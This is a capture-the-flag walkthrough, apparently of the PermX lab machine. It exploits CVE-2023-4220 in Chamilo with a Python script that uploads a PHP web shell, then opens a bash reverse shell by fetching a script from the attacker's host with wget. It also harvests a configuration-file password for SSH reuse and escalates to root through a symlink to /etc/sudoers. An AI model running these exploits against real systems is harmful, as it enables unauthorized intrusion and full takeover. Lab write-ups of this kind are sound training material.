### Enumeration

First things first I used Nmap for enumerating the open ports
```bash
nmap -Pn -sC -sV 10.129.35.142
```
- The output revealed 2 open ports:
	- port 22 open for ssh
	- port 80 open for HTTP redirecting to the `permx.htb` domain website 

We quickly add the domain in the `/etc/hosts` file
```bash
echo "10.129.35.142 permx.htb" | sudo tee -a /etc/hosts
```

### Webapp

Upon entering the website at `permx.htb`, I am met with an Online Learning Platform
![[Pasted image 20260725132127.png]]

Wandering through the site I found nothing useful or interesting so the next logical step is to try to find hidden files and folders or even hidden subdomains
- The search for hidden files or directories was not that useful
- However the search for hidden subdomains unveiled 2 hidden treasures:
```bash
ffuf -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 150 -ic -fc 302
```
- The subdomains `www` and `lms` 
![[Pasted image 20260725132617.png]]

The `www` subdomain does not lead to valuable information so maybe `lms` will provide something more "exploitable"
![[Pasted image 20260725132740.png]]
- It sure did as now I can see a login form and a website that belongs to a software named `Chamilo` , used for digital learning and stuff

Next step is to find somehow the version of this soft as maybe it is a vulnerable one
- At first glance the version is nowhere to be found so again I have to search for hidden files
```bash
ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -t 150
```
![[Pasted image 20260725134136.png]]
- a lot of hidden directories appeared and so I have to go through them and check if any of them contain something interesting

What I was looking for was inside the `/documentation/changelog.html` file which provides a list of every past version until the current one
![[Pasted image 20260725134845.png]]
- Since the last version that appears here is `1.11.24` I assume that this is the software version 

Having the `Chamilo 1.11.24` version known, a little search on Google about vulnerabilities regarding the app, won't hurt

The search rewarded me with the perfect vulnerability that being [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) which allows unauthenticated file upload by an attacker leading to Remote Code Execution via uploading of a web shell
- Also an exploit for this can be found on `Exploit Database` at: https://www.exploit-db.com/exploits/52083

I decided to try and create my own script to check if the exploit works
```python
import requests
import argparse
from urllib.parse import urljoin

def main():
    parser = argparse.ArgumentParser
    cmd = "id"
    shell = "rce.php"

    upload_url = "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
    shell_url = f"http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/{shell}"

    files = {'bigUploadFile': (shell, '<?php system($_GET["cmd"]); ?>', 'application/x-php')}

    response = requests.post(upload_url, files=files)

    if response.status_code == 200:
        print("Upload shell Success")
        print(f"access to shell: {shell_url}?cmd=")
    else:
        print("Upload shell Fail")

    response = requests.get(f"{shell_url}?cmd={cmd}")

    if response.status_code == 200:
        print(f"Output: {response.text}")
    else:
        print("COmmand fail")

if __name__ == "__main__":
    main()
```
- To check if the script work I will send the command `id` through the web shell
![[Pasted image 20260725135808.png]]
- The script worked as it gave me the id of the `www-data` user back

Now to get an active connection:
1. Craft a bash script that contains a reverse shell
```bash
#!/bin/bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.53/4444 0>&1'
```
2. Open a python web server
```bash
python3 -m http.server 80
```
3. Change the value of the `cmd` variable inside the python exploit to `wget http://10.10.16.53/shell.sh;bash ./shell.sh`
4. Open a listener inside a terminal with  `nc -lvnp 4444`
5. Run the exploit with `python3 ./exp.py` and go back to the terminal where the listener was running and voila, a reverse shell as the `www-data` user is present
![[Pasted image 20260725141551.png]]

### Foothold

Having the a shell on the system I have to gain access to the next user that has the user flag
- With a quick search inside the `/home` directory I can find my next target:
```bash
ls -la /home
```
![[Pasted image 20260725141928.png]]
- From the output I discover that my next target is the `mtz` user

Now to find a password for this user, the most usual location is inside a config file in the web app, as it is very common for users to use the same password for multiple things
- My friend Google says that since version `1.11.x` Chamilo holds the config settings in the `/app/config/configuration.php` file, so a quick look may be worth
![[Pasted image 20260725142506.png]]
- The existence of the config file was proven and because it is a large file the best way is to use `grep` to get only the fields that contain the word `password`
```bash
cat /var/www/chamilo/app/config/configuration.php | grep "password"
```
- Through the first lines a password can be found
![[Pasted image 20260725142810.png]]
- The password is: `03F6lY3uXAP2bkW8`

Having a password next step would be to use it to try to authenticate as the `mtz` user through ssh
```bash
ssh mtz@permx.htb
Password: 03F6lY3uXAP2bkW8
```
- The connection went through so now I have access as the `mtz` user and also to the user flag
![[Pasted image 20260725143129.png]]

## System Flag

The command `sudo -l` comes with a response that makes the start of the privilege escalation process
![[Pasted image 20260725143222.png]]
- I can run with `sudo` the script `/opt/acl.sh` so let's check it

The file reveals a bash script that is quite interesting:
```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
- From the script I learn that I need to give 3 parameters and based on the last command I think I have an idea what happens 

The `/usr/bin/setfacl -m u:"$user":"$perm" "$target"` can add certain permissions given by the `$perm` parameter (ex: `rwx`,`rw`) to a user `$user` for a certain target `$target` 
- Plus that is ran with `sudo` before that means I can give full permissions to the `mtz` user to any target I specify, but there are some constraints regarding the target
- The constraints regarding the target are:
	1. The target must be inside the `/home/mtz` folder
	2. The target must not contain 2 dots in consecutive order like for example `a..b` (basically prevents directory traversal)
	3. The target must be a file

Having these 3 constraints provided I figured out that I must surely use a symbolic link (`symlink`) that would lead to a file outside the `/home/mtz` directory
- Luckily the command `setfacl` allows symlinks to be provided for the `$target` and also the `! -f "$target` constraint will be passed with a symlink pointing to a file 

So my plan to escalate my privileges is to:
1. Create a symlink that points to the `/etc/sudoers` file
2. Use the `acl.sh` script to give full permissions to the `mtz` user over this file
3. Append to the file a line that would let me to run anything I want with `sudo` 
4. Get `root` access

The plan is done, so now I have to follow it:
1. I created the symlink to the `/etc/sudoers` file with the help of `ln` command
```bash
ln -s /etc/sudoers root
```
![[Pasted image 20260725144919.png]]
2. Ran the script
```bash
sudo /opt/acl.sh mtz rwx /home/mtz/root
```
3. Change the file using `echo`
```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
```
![[Pasted image 20260725145357.png]]
4. Just run `sudo /bin/bash` and I've got `root` access to the system
![[Pasted image 20260725145624.png]]

**Note**
- Try to do it fast as there is a script that will revert the changes at some time